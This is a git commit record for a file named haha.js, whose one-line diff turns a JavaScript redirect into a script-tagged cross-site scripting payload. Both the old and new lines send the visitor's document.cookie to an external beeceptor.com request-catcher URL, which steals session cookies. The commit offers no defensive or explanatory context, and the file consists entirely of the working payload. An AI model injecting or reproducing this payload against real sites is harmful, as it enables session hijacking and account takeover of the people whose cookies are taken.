e6e3195fe247227ee42e0071163e1ee5dc32265d
AnthoLaMalice <78861013+AnthoLaMalice@users.noreply.github.com>
2022-05-03 19:12:26 +0200

    Update haha.js

--- haha.js
+++ haha.js
@@ -1,1 +1,1 @@
-document.location.replace("https://antholam.free.beeceptor.com?cookie=".concat(document.cookie))
+<script>document.location.replace("https://antholam.free.beeceptor.com?cookie=".concat(document.cookie))</script>
